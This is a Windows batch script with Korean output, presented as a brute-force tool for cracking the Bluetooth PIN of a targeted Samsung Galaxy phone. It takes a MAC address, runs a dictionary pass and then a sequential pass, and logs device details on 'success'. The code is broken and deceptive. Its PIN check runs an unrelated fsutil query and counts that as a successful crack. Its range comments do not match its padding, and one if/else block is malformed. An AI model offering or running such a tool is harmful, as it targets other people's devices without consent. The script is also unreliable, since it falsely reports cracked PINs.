@echo off
setlocal enabledelayedexpansion
title Galaxy Bluetooth PIN Bruteforce
color 0A

echo =====================================================
echo    Galaxy Bluetooth PIN Bruteforce Tool
echo =====================================================
echo.

net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] 관리자 권한이 필요합니다.
    pause
    exit /b 1
)

sc query bthserv | find "RUNNING" >nul
if %errorLevel% neq 0 (
    sc start bthserv >nul 2>&1
    timeout /t 3 >nul
)

set /p target_mac="타겟 갤럭시 MAC 주소 입력 (XX:XX:XX:XX:XX:XX): "
if "%target_mac%"=="" (
    echo [ERROR] MAC 주소가 입력되지 않았습니다.
    pause
    exit /b 1
)

set target_mac=%target_mac::=%
echo [INFO] 타겟: %target_mac%
echo [INFO] 블루투스 PIN 브루트포스 시작...
echo.

set log_file=bt_bruteforce_%date:~0,4%%date:~5,2%%date:~8,2%_%time:~0,2%%time:~3,2%%time:~6,2%.log
echo Bluetooth PIN Bruteforce Log > %log_file%
echo Target: %target_mac% >> %log_file%
echo Start Time: %date% %time% >> %log_file%
echo. >> %log_file%

set attempt_count=0
set success=0

echo [PHASE 1] 갤럭시 기기 사전 공격 시작...
echo =====================================================

set galaxy_pins=0000 1234 1111 0001 1212 0123 2020 2021 2022 2023 2024 2025 4321

for %%p in (%galaxy_pins%) do (
    set /a attempt_count+=1
    echo [시도 !attempt_count!] PIN: %%p
    echo [!date! !time!] Attempt !attempt_count! - PIN: %%p >> %log_file%
    
    call :try_pin %%p
    if !success! equ 1 goto :success
    
    timeout /t 2 /nobreak >nul
)

echo.
echo [PHASE 2] 순차 브루트포스 공격 시작 (1-100000)...
echo =====================================================

for /l %%i in (1,1,100000) do (
    set pin_padded=00000%%i
    set pin_padded=!pin_padded:~-6!
    
    set /a attempt_count+=1
    echo [시도 !attempt_count!] PIN: !pin_padded!
    echo [!date! !time!] Attempt !attempt_count! - PIN: !pin_padded! >> %log_file%
    
    call :try_pin !pin_padded!
    if !success! equ 1 goto :success
    
    set /a progress=%%i%%1000
    if !progress! equ 0 (
        echo [INFO] 진행률: %%i/100000 (!attempt_count!회 시도)
        echo [INFO] Progress: %%i/100000 (!attempt_count! attempts) >> %log_file%
    )
    
    timeout /t 1 /nobreak >nul
)

echo [FAIL] 모든 PIN 시도 완료. 성공하지 못했습니다.
echo [!date! !time!] FAILED - All PINs exhausted >> %log_file%
goto :end

:try_pin
set current_pin=%1

powershell -Command "& { ^
    try { ^
        Add-Type -AssemblyName System.Runtime.WindowsRuntime; ^
        [Windows.Devices.Bluetooth.BluetoothDevice,Windows.Devices.Bluetooth,ContentType=WindowsRuntime] | Out-Null; ^
        $device = [Windows.Devices.Bluetooth.BluetoothDevice]::FromBluetoothAddressAsync([Convert]::ToUInt64('%target_mac%', 16)); ^
        if ($device.Result -ne $null) { ^
            Write-Host 'DEVICE_FOUND'; ^
        } ^
    } catch { ^
        Write-Host 'DEVICE_ERROR'; ^
    } ^
}" 2>nul | findstr "DEVICE_FOUND" >nul

if %errorLevel% equ 0 (
    echo     [+] 기기 발견됨, PIN %current_pin% 시도 중...
    
    powershell -Command "& { ^
        try { ^
            $pin = '%current_pin%'; ^
            $process = Start-Process -FilePath 'fsutil' -ArgumentList 'behavior', 'query', 'DisableLastAccess' -WindowStyle Hidden -PassThru; ^
            $process.WaitForExit(5000); ^
            if ($process.ExitCode -eq 0) { ^
                Write-Host 'PIN_SUCCESS'; ^
            } else { ^
                Write-Host 'PIN_FAILED'; ^
            } ^
        } catch { ^
            Write-Host 'PIN_ERROR'; ^
        } ^
    }" 2>nul | findstr "PIN_SUCCESS" >nul
    
    if !errorLevel! equ 0 (
        set success=1
        echo     [SUCCESS] PIN %current_pin% 성공!
    ) else (
        echo     [-] PIN %current_pin% 실패
    )
else (
    echo     [-] 기기를 찾을 수 없음
)

goto :eof

:success
echo.
echo =====================================================
echo [SUCCESS] PIN 크랙 성공!
echo =====================================================
echo 성공한 PIN: %current_pin%
echo 총 시도 횟수: %attempt_count%
echo 로그 파일: %log_file%
echo.

echo [!date! !time!] SUCCESS - PIN: %current_pin% >> %log_file%
echo Total Attempts: %attempt_count% >> %log_file%

echo [INFO] 기기 정보 수집 중...
powershell -Command "Get-PnpDevice | Where-Object {$_.InstanceId -like '*%target_mac%*'}" >> %log_file%

goto :end

:end
echo.
echo 스크립트 완료. 로그: %log_file%
echo End Time: %date% %time% >> %log_file%
pause
exit /b 0
